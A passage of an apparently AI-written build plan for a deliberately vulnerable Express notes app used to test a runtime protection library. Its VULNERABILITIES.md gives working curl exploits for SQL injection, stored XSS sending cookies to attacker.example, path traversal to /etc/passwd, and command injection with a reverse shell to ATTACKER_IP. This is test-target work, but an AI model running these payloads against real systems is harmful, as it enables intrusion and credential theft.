nav { background: #1a1a2e; padding: 0.75rem 1.5rem; display: flex; gap: 1rem; align-items: center; }
nav a { color: #e0e0e0; text-decoration: none; }
nav a:hover { color: #fff; }
nav button { background: none; border: 1px solid #555; color: #ccc; padding: 0.25rem 0.75rem; cursor: pointer; border-radius: 4px; }
main { max-width: 860px; margin: 2rem auto; padding: 0 1rem; }
h1 { margin-bottom: 1rem; }
h2 { margin: 1.5rem 0 0.75rem; }
.page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
form label { display: flex; flex-direction: column; margin-bottom: 0.75rem; gap: 0.25rem; font-weight: 500; }
form input[type=text], form input[type=password], form textarea { padding: 0.4rem 0.6rem; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; width: 100%; }
form textarea { resize: vertical; }
.btn { display: inline-block; padding: 0.4rem 1rem; background: #1a1a2e; color: #fff; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; font-size: 0.9rem; }
.btn-danger { background: #c0392b; }
button[type=submit] { padding: 0.5rem 1.25rem; background: #1a1a2e; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 1rem; }
.error { color: #c0392b; margin-bottom: 1rem; }
.success { color: #27ae60; margin-bottom: 1rem; }
.meta { color: #666; font-size: 0.9rem; margin-bottom: 1rem; }
.post-list { list-style: none; }
.post-list li { padding: 0.75rem 0; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; }
.post-list a { font-weight: 500; }
.post-content, .bio { background: #fff; padding: 1rem; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 1rem; white-space: pre-wrap; }
.search-form { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; }
.search-form input { flex: 1; }
.output { background: #111; color: #0f0; padding: 1rem; border-radius: 4px; font-size: 0.85rem; white-space: pre-wrap; margin-top: 1rem; }
.actions { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
section { margin-bottom: 2rem; }
table { width: 100%; border-collapse: collapse; }
table th, table td { padding: 0.5rem; text-align: left; border-bottom: 1px solid #ddd; }
table th { background: #eee; }
```

- [ ] **Step 2: Commit**

```bash
git add public/style.css
git commit -m "chore: minimal CSS styling"
```

---

## Task 13: README and VULNERABILITIES.md

**Files:**
- Create: `README.md`
- Create: `VULNERABILITIES.md`

- [ ] **Step 1: Write README.md**

```markdown
# Vulnerable Notes App

A deliberately vulnerable Node.js/Express web application for use as a baseline attack target during RASP library evaluation. **Do not deploy to production or expose to the internet.**

## Quick Start

```bash
docker compose up
```

The app will be available at **http://localhost:3000** once the database is ready (health check takes ~10 seconds on first run).

## Seed Credentials

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | admin |
| alice    | alice123  | user  |
| bob      | bob123    | user  |

## Architecture

- **App:** Node.js 20 + Express 4 on port 3000
- **Database:** PostgreSQL 15 on port 5432 (internal only)
- **Sessions:** Cookie-based via express-session (no JWT)
- **Views:** EJS server-side rendering

## Vulnerability Summary

See [VULNERABILITIES.md](./VULNERABILITIES.md) for exact endpoints, source locations, and working `curl` exploit examples for all four vulnerability categories.

## Resetting State

```bash
docker compose down -v && docker compose up
```

This wipes all volumes and re-seeds the database from scratch.
```

- [ ] **Step 2: Write VULNERABILITIES.md**

See Task 14 for the full content of this file with working curl commands.

- [ ] **Step 3: Commit README only (VULNERABILITIES.md has its own task)**

```bash
git add README.md
git commit -m "docs: README with setup instructions and seed credentials"
```

---

## Task 14: VULNERABILITIES.md with curl PoCs

**Files:**
- Create: `VULNERABILITIES.md`

- [ ] **Step 1: Write VULNERABILITIES.md**

This file must be copy-paste ready. All cookie values shown as `SESSION_COOKIE` — the reader replaces it with the value from the `Set-Cookie` header on the login response.

````markdown
# Vulnerability Reference

All four vulnerabilities below are intentional and present in the baseline (unprotected) configuration. Each entry lists the exact endpoint, the source file and line responsible, and a working `curl` command that exploits it end-to-end.

---

## 1. SQL Injection — Authentication Bypass (`POST /login`)

**Endpoint:** `POST /login`

**Source:** `src/routes/auth.js` — the query inside `router.post('/login', ...)`:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**How it works:** The `username` field is embedded directly in the SQL string. Injecting `' OR '1'='1' --` terminates the `username` condition early and comments out the `AND password = ...` clause, returning the first row unconditionally.

**curl PoC — login bypass (no password needed):**
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=' OR '1'='1' --&password=anything"
```

Expected: HTTP 302 redirect to `/posts` with a `Set-Cookie: connect.sid=...` header. The `cookies.txt` jar now contains the admin session.

**Verify access:**
```bash
curl -s -b cookies.txt http://localhost:3000/admin | grep -o '<h1>.*</h1>'
```

Expected output: `<h1>Admin Panel</h1>`

---

## 2. SQL Injection — Data Exfiltration (`GET /posts/search`)

**Endpoint:** `GET /posts/search?q=`

**Source:** `src/routes/posts.js` — the query inside `router.get('/search', ...)`:
```javascript
const query = `SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.title LIKE '%${q}%' OR p.content LIKE '%${q}%' ORDER BY p.created_at DESC`;
```

**How it works:** The `q` parameter is embedded directly in the LIKE clauses. A UNION-based injection can extract arbitrary data from any table.

**Step 1 — Get a valid session (legitimate login):**
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=alice&password=alice123"
```

**Step 2 — Inject UNION to dump all usernames and passwords:**
```bash
curl -s -b cookies.txt -G \
  --data-urlencode "q=%' UNION SELECT 1, u.id, u.username, u.password, u.bio, NOW(), NOW() FROM users u --" \
  http://localhost:3000/posts/search
```

Expected: The response HTML contains a post list that includes entries for each user row, with the `password` column value rendered in place of the `title` field.

---

## 3. Stored XSS — Bio Field and Post Content

**Endpoint (store payload):** `POST /profile` (bio) or `POST /posts` (post content)
**Endpoint (trigger):** `GET /users/:id` or `GET /posts/:id`

**Source (bio):** `views/profile.ejs`:
```ejs
<div class="bio"><%- profile.bio || '<em>No bio set.</em>' %></div>
```

**Source (post content):** `views/posts/show.ejs`:
```ejs
<div class="post-content"><%- post.content %></div>
```

**How it works:** EJS `<%- %>` outputs raw HTML without escaping. Any `<script>` tag stored in the database is injected directly into the page DOM.

**curl PoC — store XSS payload in bio:**

Step 1: Login as alice:
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=alice&password=alice123"
```

Step 2: Set malicious bio:
```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/profile \
  -d 'bio=<script>document.write("<img src=x onerror=alert(document.cookie)>")</script>'
```

Step 3: Login as bob and visit alice's profile (alice's user_id is 2):
```bash
curl -i -s -c bob_cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=bob&password=bob123"

curl -s -b bob_cookies.txt http://localhost:3000/users/2
```

Expected: The response body contains the raw `<script>` tag un-escaped. In a browser, this executes and shows `document.cookie`.

**curl PoC — store XSS payload in post content:**

Step 1: Login as alice:
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=alice&password=alice123"
```

Step 2: Create post with script payload:
```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/posts \
  -F 'title=Totally Normal Post' \
  -F 'content=<script>fetch("http://attacker.example/steal?c="+document.cookie)</script>'
```

Step 3: Note the redirect URL for the new post ID, then visit it as any other user:
```bash
# List posts to find the ID
curl -s -b cookies.txt http://localhost:3000/posts | grep 'Totally Normal Post'

# Visit the post (replace 11 with the actual ID)
curl -s -b cookies.txt http://localhost:3000/posts/11
```

Expected: Raw `<script>` tag in the response body.

---

## 4. Path Traversal / LFI (`GET /posts/:id/attachment`)

**Endpoint:** `GET /posts/:id/attachment?file=<filename>`

**Source:** `src/routes/posts.js` — inside `router.get('/:id/attachment', ...)`:
```javascript
const filePath = path.join(UPLOAD_DIR, file);
fs.readFile(filePath, (err, data) => { ... res.send(data); });
```

**How it works:** `path.join` resolves `../` sequences but does not prevent the result from escaping `UPLOAD_DIR`. A `file` parameter containing enough `../` segments traverses up to the filesystem root.

**curl PoC — read /etc/passwd from the container:**

Step 1: Login to get a session:
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=alice&password=alice123"
```

Step 2: Traverse to /etc/passwd (the app runs in /app, uploads are in /app/uploads — 3 levels up):
```bash
curl -s -b cookies.txt \
  "http://localhost:3000/posts/1/attachment?file=../../../etc/passwd"
```

Expected: The raw contents of `/etc/passwd` from inside the container.

**Alternative — read the app's own source code:**
```bash
curl -s -b cookies.txt \
  "http://localhost:3000/posts/1/attachment?file=../../src/routes/auth.js"
```

---

## 5. Command Injection (`POST /admin/ping`)

**Endpoint:** `POST /admin/ping`

**Source:** `src/routes/admin.js` — inside `router.post('/ping', ...)`:
```javascript
exec(`ping -c 3 ${host}`, { timeout: 10000 }, ...);
```

**How it works:** The `host` parameter is embedded directly in a shell command string passed to `child_process.exec`. Shell metacharacters like `;`, `&&`, and `|` chain additional commands.

**curl PoC — read /etc/passwd via command injection:**

Step 1: Login as admin:
```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  -d "username=admin&password=admin123"
```

Step 2: Inject `; cat /etc/passwd` after a valid host:
```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  -d "host=127.0.0.1 ; cat /etc/passwd"
```

Expected: The response HTML contains the `<pre class="output">` block with the ping output followed by the full contents of `/etc/passwd`.

**Alternative — reverse shell (requires netcat listener on attacker host):**
```bash
# On attacker machine:
nc -lvnp 4444

# Inject reverse shell:
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  --data-urlencode "host=127.0.0.1 ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**Alternative — data exfiltration via DNS:**
```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  --data-urlencode "host=127.0.0.1 ; curl http://attacker.example/\$(whoami)"
```
````

- [ ] **Step 2: Commit**

```bash
git add VULNERABILITIES.md
git commit -m "docs: VULNERABILITIES.md with endpoint refs, source locations, and curl PoCs"
```

---

## Self-Review Checklist

**Spec coverage:**
- [x] Node.js + Express (no Next.js, no fullstack framework)
- [x] EJS server-side rendering
- [x] PostgreSQL via Docker Compose (not SQLite)
- [x] Raw pg driver with string concatenation at all 4 vuln points
- [x] Register/Login with cookie sessions (no JWT)
- [x] CRUD posts
- [x] User bio field
- [x] File upload and download
- [x] Admin panel with diagnostic utility
- [x] 3 seed users (1 admin) + 10 posts
- [x] SQLi in POST /login (string concat)
- [x] SQLi in GET /posts/search (string concat)
- [x] XSS in bio field (<%- %> in profile.ejs)
- [x] XSS in post content (<%- %> in posts/show.ejs)
- [x] Path Traversal in GET /posts/:id/attachment?file=
- [x] Command Injection in POST /admin/ping via exec()
- [x] try/catch around all async ops (error handling without security)
- [x] No rate limiting, CSRF, helmet, CSP, WAF, logSguarDian
- [x] No TLS — plain HTTP
- [x] Dockerfile + docker-compose.yml (single `docker compose up`)
- [x] Seed loaded automatically on container start
- [x] README with port and credentials
- [x] VULNERABILITIES.md with endpoint, file:line, and curl PoC

**Placeholder scan:** No TBDs or TODOs. All code blocks are complete.

**Type consistency:** All route files use `req.session.user` consistently. All views receive `user`, `profile`/`post`/etc. consistently.
